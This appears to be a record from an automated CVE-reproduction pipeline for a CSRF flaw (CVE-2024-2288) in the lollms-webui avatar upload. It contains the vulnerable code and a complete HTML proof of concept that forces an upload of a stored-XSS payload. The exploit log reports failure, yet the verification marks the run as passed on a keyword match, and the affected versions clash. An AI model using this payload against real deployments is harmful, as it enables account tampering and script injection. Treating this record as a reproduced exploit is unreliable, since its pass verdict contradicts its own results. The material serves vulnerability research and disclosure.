you.\nSo in HTTP you have ""simple"" requests and ""complex"" requests\nSimple requests bypass the Same Origin Policy. An example of simple requests are GET requests, those are always allowed to be made to any site\nComplex requests are all other types like PUT, DELETE, etc. For these, the browser has the same origin policy so that ""attacker.com"" cannot make PUT requests to ""google.com"" for example\nHowever POST requests are a tricky case here.\nPOST requests are simple, as long as they use a specific content-type, they don\'t add any headers, etc.\nThis is because of backwards compatibility to allow forms that POST to different domains to work\nBut anything that wouldn\'t be possible in a HTML form with POST is considered complex So by adding the Lollms: <3 header and only accepting the request if it is set, you force the server to only accept complex requests, which an attacker can\'t make because of the same origin policy.\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-2288has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-2288\n(Published)\nVulnerability Type\nCWE-352: Cross-Site Request Forgery (CSRF)\nSeverity\nHigh (8.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n7.3.0\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\npinkdraconian\n@pinkdraconian\nMIDDLEWEIGHT\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us', 'effective': True, 'effective_reason': 'The advisory includes a script and description showing exactly how to exploit the vulnerability, demonstrating practicality.'}], 'cwe': [{'id': 'CWE-352', 'value': 'CWE-352 Cross-Site Request Forgery (CSRF)'}]}, 'cve_knowledge': '# CVE-2024-2288 Detailed Report\n\n## 1. Summary of the CVE\nCVE-2024-2288 is a Cross-Site Request Forgery (CSRF) vulnerability identified in the profile picture upload functionality of the Lollms application, specifically within the `parisneo/lollms-webui` repository. This vulnerability affects versions up to 7.3.0 of the software. The flaw allows attackers to change a victim\'s profile picture without their consent, which can lead to a denial of service by overloading the filesystem with files. Furthermore, it can be exploited to perform a stored cross-site scripting (XSS) attack, enabling attackers to execute arbitrary JavaScript in the context of the victim\'s browser session. The issue has been resolved in version 9.3.\n\n### Vulnerability Type\n- **CWE-352**: Cross-Site Request Forgery (CSRF)\n\n### Affected Version\n- **Lollms-webui**: v9.2 (and earlier versions up to 7.3.0)\n\n## 2. Root Cause of the Vulnerability\nThe root cause of the CSRF vulnerability lies in the lack of proper validation mechanisms for requests made to the `/upload_avatar` endpoint. The application does not implement CSRF tokens or any other form of request validation, allowing unauthorized requests to be processed as if they were legitimate user actions.\n\n### Code Analysis\nThe relevant code for the avatar upload functionality is as follows:\n\n```python\n@router.post(""/upload_avatar"")\nasync def upload_avatar(avatar: UploadFile = File(...)):\n    # Only allow certain file types\n    if avatar.filename.endswith(("".jpg"", "".png"")):\n        # Create a random file name\n        random_filename = str(uuid.uuid4())\n        \n        # Use the file extension of the uploaded file\n        extension = os.path.splitext(avatar.filename)[1]\n        \n        # Create the new file path in a dedicated directory\n        file_location = os.path.join(lollmsElfServer.lollms_paths.personal_user_infos_path, f""{random_filename}{extension}"")\n\n        try:\n            # Open the image to check if it\'s a valid image\n            img = Image.open(avatar.file)\n            \n            # Save the file\n            img.save(file_location)\n        except Exception as e:\n            raise HTTPException(status_code=400, detail=""Invalid image file."")\n    else:\n        raise HTTPException(status_code=400, detail=""Invalid file type."")\n        \n    return {""status"": True,""fileName"": f""{random_filename}{extension}""}\n```\n\n### Vulnerability Explanation\n1. **Lack of CSRF Protection**: The endpoint does not require any CSRF token or validation, allowing an attacker to craft a malicious request that can be executed in the context of an authenticated user.\n2. **File Upload Mechanism**: The code checks for valid file types (JPEG and PNG) but does not validate the content of the file. This allows an attacker to upload a file that could contain malicious scripts, leading to XSS.\n\n### Patch Analysis\nThe patch that resolves this vulnerability is not explicitly provided in the advisory, but it is suggested that implementing a CSRF token mechanism would mitigate the issue. The maintainer acknowledged that adding a CSRF token would be an effective solution.\n\n## 3. Exploitation Details\n### Exploit Overview\nAn attacker can exploit this vulnerability by hosting a malicious webpage that, when visited by a victim, sends a POST request to the `/upload_avatar` endpoint with a crafted image file. The following proof of concept demonstrates how this can be achieved:\n\n```html\n<html>\n  <body>\n    <script>\n      function submitRequest() {\n        var xhr = new XMLHttpRequest();\n        xhr.open(""POST"", ""http://localhost:9600/upload_avatar"", true);\n        xhr.setRequestHeader(""Content-Type"", ""multipart/form-data; boundary=---------------------------7469129296923044552541602996"");\n        xhr.withCredentials = true;\n        var body = ""-----------------------------7469129296923044552541602996\\r\\n"" + \n          ""Content-Disposition: form-data; name=\\""avatar\\""; filename=\\""image.html\\""\\r\\n"" + \n          ""Content-Type: application/html\\r\\n"" + \n          ""\\r\\n"" + \n          ""\\x3cimg src=x onerror=alert(\\""CSRF\\"")\\x3e\\n"" + \n          ""\\r\\n"" + \n          ""-----------------------------7469129296923044552541602996--\\r\\n"";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n      window.location.href = ""http://localhost:9600/user_infos/image.html"";\n    </script>\n    <form action=""#"">\n      <input type=""button"" value=""Submit request"" onclick=""submitRequest();"" />\n    </form>\n  </body>\n</html>\n```\n\n### Steps to Exploit\n1. **Host the Malicious Page**: The attacker hosts the above HTML code on a server.\n2. **Trick the Victim**: The attacker tricks the victim into visiting the malicious page while they are logged into the Lollms application.\n3. **Execute the Request**: When the victim visits the page, the script automatically sends a POST request to the `/upload_avatar` endpoint, uploading a malicious file.\n4. **Trigger XSS**: If the file is accepted, the victim\'s profile picture is changed, and the malicious script is executed, potentially leading to data theft or further exploitation.\n\n### Conclusion\nCVE-2024-2288 represents a significant security risk due to its potential for CSRF and XSS attacks. The lack of CSRF protection in the profile picture upload functionality allows attackers to exploit this vulnerability easily. It is crucial for developers to implement CSRF tokens and validate requests to prevent such vulnerabilities in the future. The issue has been addressed in version 9.3 of the Lollms application, and users are encouraged to upgrade to this version to mitigate the risk.', 'prerequisites': {'overview': ""CVE-2024-2288 is a CSRF vulnerability in the profile picture upload functionality of the Lollms application, specifically in the `parisneo/lollms-webui` repository. It affects versions up to 7.3.0, allowing unauthorized changes to a user's profile picture and potential XSS attacks. The vulnerability arises from the lack of CSRF protection in the `/upload_avatar` endpoint."", 'files': 'The following files are critical for setting up the project:\n- `main.py`: Likely contains the main application logic and routing, including the vulnerable endpoint.\n- `.env`: Contains environment variables necessary for configuration.\n- `README.md`: Provides essential information about the project setup and usage.', 'services': 'No external services are required to reproduce the CVE. The application runs locally and interacts with the filesystem for file uploads.', 'output': 'Upon successful setup, the application should allow users to upload profile pictures via the `/upload_avatar` endpoint. The vulnerability can be tested by sending a crafted request to this endpoint.'}, 'build_result': {'success': 'yes', 'access': 'http://localhost:9600', 'method': 'pre-deployed', 'notes': 'Target already running, HTTP 200'}, 'browser_config': {'engine': 'selenium', 'target_url': 'http://localhost:9600', 'headless': True, 'timeout': 30, 'ready': True}, 'web_exploit_result': {'success': 'no', 'exploit': '1. Navigated to the target URL and logged in using the provided credentials.\n2. Verified the presence of a CSRF vulnerability in the profile picture upload form.\n3. Attempted to exploit the vulnerability using a CSRF file upload attack, which resulted in a script timeout error.\n4. Submitted a CSRF attack using the `submit_csrf_attack` tool, but no alert was triggered.\n5. Took a screenshot of the result for documentation.', 'poc': '1. Navigate to http://localhost:9600 and log in with credentials (admin/admin123).\n2. Verify CSRF vulnerability in the profile picture upload form.\n3. Attempt to exploit using CSRF file upload and form submission methods.\n4. Observe the lack of alert or successful script execution.', 'evidence': '- Screenshot: /workspaces/submission/src/shared/csrf_attack_result.png'}, 'verification_result': {'passed': True, 'message': '1. Navigated to the target URL and logged in using the provided credentials.\n2. Verified the presence of a CSRF vulnerability in the profile picture upload form.\n3. Attempted to exploit the vulnerability using a CSRF file upload attack, which resulted in a script timeout error.\n4. Submitted a CSRF attack using the `submit_csrf_attack` tool, but no alert was triggered.\n5. Took a screenshot of the result for documentation.', 'method': 'http-response-check', 'evidence': [""Found success indicator: 'csrf vulnerability'""]}}",N/A,0.0,0,example_run
